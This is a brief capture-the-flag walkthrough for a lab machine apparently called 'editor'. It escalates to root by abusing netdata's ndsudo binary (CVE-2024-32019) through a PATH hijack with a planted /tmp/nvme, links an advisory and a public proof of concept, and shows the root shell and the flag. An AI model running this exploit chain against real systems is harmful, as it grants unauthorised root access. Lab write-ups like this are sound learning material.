the most likely way to obtain root access is through ndsudo binary because it means netdata sudo

Found this: https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93

and I will use this:

https://github.com/AzureADTrent/CVE-2024-32019-POC

```shell
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
oliver@editor:~$ chmod +x /tmp/nvme
export PATH=/tmp:$PATH
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/home/oliver# whoami
root
root@editor:/home/oliver# cd /root
root@editor:/root# ls
root.txt  scripts  snap
root@editor:/root# cat root.txt
85ee982b626c86f48586055531285f68
root@editor:/root# 

```
